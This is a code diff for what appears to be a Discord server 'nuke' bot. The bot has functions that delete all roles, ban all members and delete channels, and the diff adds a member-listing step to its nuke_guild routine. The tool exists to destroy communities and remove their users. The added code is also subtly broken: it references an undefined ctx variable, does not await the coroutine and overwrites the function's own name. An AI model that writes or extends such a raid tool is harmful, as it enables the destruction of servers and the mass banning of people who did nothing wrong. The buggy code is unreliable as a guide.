@@ -45,6 +45,10 @@ async def delete_all_roles(guild):
             continue
     return deleted
 
+async def memberList(ctx):
+    for member in ctx.message.guild.members:
+        print(member.name)
+
 async def ban_all_members(guild):
     banned = 0
     for member in guild.members:
@@ -80,6 +84,8 @@ async def create_text_channels(guild, name):
 
 async def nuke_guild(guild):
     print(f'{r}Nuke: {m}{guild.name}')
+    memberList = memberList(ctx)
+    print(f'{m}Member List:{b}{memberList}')
     banned = await ban_all_members(guild)
     print(f'{m}Banned:{b}{banned}')
     deleted_channels = await delete_all_channel(guild)
